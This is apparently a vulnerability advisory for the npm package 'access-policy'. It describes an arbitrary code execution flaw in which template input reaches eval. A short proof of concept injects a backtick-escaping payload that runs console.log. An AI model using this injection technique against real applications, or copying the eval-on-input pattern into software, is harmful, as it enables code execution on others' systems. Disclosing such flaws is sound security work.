# Overview

`access-policy` is a package that encodes and decodes policy JSON files for use with web applications.

This package is vulnerable to Arbitrary Code Execution. User input provided to the template function is executed by the `eval` function resulting in potential malicious code execution.

# Proof of Concept

```
var a = require("access-policy")
var statements = '`;console.log(123);//'
data = {}

a.encode(statements, data)
```
